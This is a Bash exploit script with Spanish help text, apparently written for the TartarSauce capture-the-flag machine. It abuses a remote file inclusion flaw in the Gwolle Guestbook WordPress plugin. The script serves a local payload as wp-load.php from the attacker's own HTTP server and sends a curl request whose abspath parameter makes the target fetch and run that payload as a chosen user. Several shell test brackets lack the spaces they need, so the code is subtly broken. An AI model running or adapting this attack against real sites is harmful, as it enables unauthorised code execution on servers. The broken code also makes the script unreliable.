#!/bin/bash

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n\n[*] Exiting....\n"
}

function helpPanel(){
	echo -e "\nUso:"
	echo -e "\t[-u] Usuario (www-data|onuma)"
	echo -e "\t[-h] Mostrar este panel de ayuda\n"
	exit 1
}


function getAccess(){
	if ["$username" == "www-data"]; then
		cp www-data wp-load.php
		python3 -m http.server 80 > /dev/null 2>&1 &
		curl "http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.21/"
		rm wp-load.php 2> /dev/null
		kill -9 $(lsof -i:80 | grep python | awk '{print $2}') > /dev/null 2>&1
	elif ["$username" == "onuma"]; then
                cp onuma wp-load.php
                python3 -m http.server 80 > /dev/null 2>&1 &
                curl "http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.21/"
                rm wp-load.php 2> /dev/null
                kill -9 $(lsof -i:80 | grep python | awk '{print $2}') > /dev/null 2>&1
	else
		echo -e "\n[!] Usuario no Existente"
	fi
}

declare -i parameter_enable=0;
while getopts ":u:h:" arg; do
	case $arg in
		u) username=$OPTARG && let parameter_enable+=1;;
		h) helpPanel;;
	esac
done


if [$parameter_enable -ne 1]; then
	helpPanel
else
	getAccess
fi
